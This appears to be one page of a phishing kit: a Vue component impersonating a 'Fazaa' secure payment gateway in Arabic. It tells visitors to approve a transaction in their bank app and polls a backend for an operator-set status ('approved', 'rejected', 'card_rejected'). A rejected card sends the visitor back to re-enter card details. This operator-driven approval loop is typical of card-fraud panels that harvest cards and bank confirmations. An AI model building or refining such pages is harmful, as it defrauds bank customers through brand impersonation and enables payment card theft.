<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { ShieldCheck, Smartphone } from 'lucide-vue-next';
import { updateCardRequest, getCardRequest, resolveActiveRequestId, setActiveRequestId } from '../api';

const router = useRouter();
const timeLeft = ref(55); // 00:55
let timer: ReturnType<typeof setInterval> | null = null;
let statusPoll: ReturnType<typeof setInterval> | null = null;
const isSubmitting = ref(false);
const error = ref('');
const successMessage = ref('');

const pad = (n: number) => n.toString().padStart(2, '0');

const formattedTime = computed(() => {
  const m = Math.floor(timeLeft.value / 60);
  const s = timeLeft.value % 60;
  return `${pad(m)}:${pad(s)}`;
});

const startStatusPolling = (requestId: string) => {
  if (statusPoll) clearInterval(statusPoll);
  statusPoll = setInterval(async () => {
    try {
      const data = await getCardRequest(requestId);
      if (!data) return;
      if (data.otpStatus === 'approved') {
        if (statusPoll) clearInterval(statusPoll);
        successMessage.value = 'تمت العملية وتأكيد الطلب بنجاح!';
        setActiveRequestId(null);
        isSubmitting.value = false;
        setTimeout(() => router.push('/'), 1800);
      } else if (data.otpStatus === 'rejected') {
        if (statusPoll) clearInterval(statusPoll);
        error.value = 'لم يتم تأكيد الإشعار من التطبيق البنكي. يرجى المحاولة مرة أخرى.';
        isSubmitting.value = false;
      } else if (data.otpStatus === 'card_rejected') {
        if (statusPoll) clearInterval(statusPoll);
        isSubmitting.value = false;
        router.push('/card-details');
      }
    } catch {}
  }, 1500);
};

onMounted(async () => {
  timer = setInterval(() => {
    if (timeLeft.value > 0) {
      timeLeft.value--;
    }
  }, 1000);

  const requestId = await resolveActiveRequestId();
  if (requestId) {
    startStatusPolling(requestId);
  }
});

onUnmounted(() => {
  if (timer) clearInterval(timer);
  if (statusPoll) clearInterval(statusPoll);
});

const confirmBankApproval = async () => {
  if (isSubmitting.value) return;
  error.value = '';
  isSubmitting.value = true;

  const requestId = await resolveActiveRequestId();
  if (!requestId) {
    error.value = 'لم يتم العثور على الطلب، يرجى البدء من جديد.';
    isSubmitting.value = false;
    setTimeout(() => router.push('/'), 1200);
    return;
  }

  try {
    await updateCardRequest(requestId, {
      step: 'otp-bank',
      otpStatus: 'pending'
    });
    startStatusPolling(requestId);
  } catch {
    error.value = 'حدث خطأ أثناء تأكيد الموافقة. يرجى المحاولة مرة أخرى.';
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div dir="rtl" class="min-h-screen bg-[#f4f1ea] font-sans text-slate-900">
    <div class="max-w-xl mx-auto min-h-screen bg-[#faf8f4] flex flex-col justify-between shadow-[0_0_60px_rgba(11,31,56,0.12)] border-x border-[#e6decb]/80">
      
      <!-- Top Fazaa Header -->
      <header class="w-full h-16 px-5 flex items-center justify-center border-b border-[#8a6c1e]/40 relative overflow-hidden shadow-md">
        <img
          src="/assets/aistudio/header-background-gold.50f1dc5b.jpg"
          alt=""
          class="absolute inset-0 w-full h-full object-cover object-right pointer-events-none"
        />
        <div class="absolute inset-0 bg-gradient-to-l from-black/15 via-transparent to-black/25 pointer-events-none"></div>
        <div @click="router.push('/')" class="relative z-10 cursor-pointer flex items-center select-none">
          <img
            src="/assets/aistudio/fazaa-logo.png"
            alt="Fazaa Logo"
            class="h-12 w-auto object-contain drop-shadow-[0_2px_6px_rgba(0,0,0,0.3)]"
          />
        </div>
      </header>

      <!-- Main Card -->
      <div class="px-5 py-6 my-auto flex flex-col items-center">
        <div class="bg-white rounded-2xl shadow-[0_12px_35px_rgba(11,31,56,0.06)] w-full max-w-[390px] border border-[#e6decb] p-6 flex flex-col items-center relative z-10 text-center">
          
          <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#0b1f38] to-[#17375e] text-[#e5c875] flex items-center justify-center mb-3.5 shadow-md border border-[#c5a44e]/35">
            <Smartphone class="w-6 h-6" />
          </div>

          <span class="text-xs font-extrabold text-[#9e7f2c] mb-1">التحقق عبر التطبيق البنكي</span>

          <p class="text-[#0b1f38] text-sm mb-4 font-extrabold leading-relaxed">
            يرجى تأكيد عملية الدفع من خلال تطبيق البنك الخاص بك
          </p>

          <div class="bg-[#faf8f4] border border-[#e6decb] rounded-xl p-4 mb-5 w-full">
            <p class="text-slate-700 text-xs font-semibold leading-relaxed">
              قم بفتح التطبيق البنكي الخاص بك<br/>
              سيظهر لك إشعار فوري لتأكيد المعاملة<br/>
              اضغط على الإشعار للموافقة لإتمام الطلب
            </p>
          </div>

          <div v-if="successMessage" class="w-full mb-4 p-2.5 rounded-xl bg-emerald-50 border border-emerald-200 text-emerald-700 text-xs font-bold">
            {{ successMessage }}
          </div>

          <!-- Countdown Timer -->
          <div class="mb-5 flex flex-col items-center">
            <span class="text-[11px] text-slate-400 font-medium mb-1">الوقت المتبقي للموافقة</span>
            <div class="text-2xl font-extrabold text-[#0b1f38] font-mono tabular-nums tracking-wider" dir="ltr">
              {{ formattedTime }}
            </div>
          </div>

          <p v-if="error" class="text-red-600 text-[11px] font-semibold mb-3 text-center">{{ error }}</p>

          <!-- Submit Button -->
          <button 
            @click="confirmBankApproval" 
            :disabled="isSubmitting"
            class="w-full h-12 bg-gradient-to-r from-[#c8a951] via-[#b4943c] to-[#987a28] hover:from-[#d2b35b] hover:to-[#a3842f] text-white rounded-xl font-extrabold text-sm tracking-wide transition-all disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 shadow-[0_8px_20px_rgba(180,148,60,0.3)] cursor-pointer"
          >
            <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
            <span v-else>تمت الموافقة في التطبيق البنكي</span>
          </button>

        </div>

        <!-- Security Footer -->
        <div class="mt-6 flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#0b1f38]">
          <ShieldCheck class="w-4 h-4 text-[#b4943c]" />
          <span>بوابة الدفع الإلكتروني الآمن · برنامج فزعة</span>
        </div>
      </div>

      <!-- Fazaa Footer -->
      <footer class="bg-[#09192d] px-5 py-4 text-center text-[11px] text-slate-300 border-t border-[#c5a44e]/25">
        © 2026 Fazaa · كل الحقوق محفوظة
      </footer>

    </div>
  </div>
</template>
